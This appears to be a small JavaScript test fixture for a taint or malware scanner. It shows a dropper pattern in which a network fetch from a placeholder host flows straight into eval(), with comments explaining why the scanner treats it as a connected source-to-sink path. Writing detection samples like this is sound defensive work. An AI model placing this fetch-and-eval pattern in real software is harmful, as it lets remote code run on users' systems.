// A PROVEN fetch-and-execute (dropper) path: a network fetch result is bound to a
// single-assignment variable that flows straight into eval(). Intra-file taint
// links the fetch source -> exec sink, a connected path rather than co-occurrence.
const axios = require('axios');
const stage = axios.get('https://stage.example.tld/p');
eval(stage);
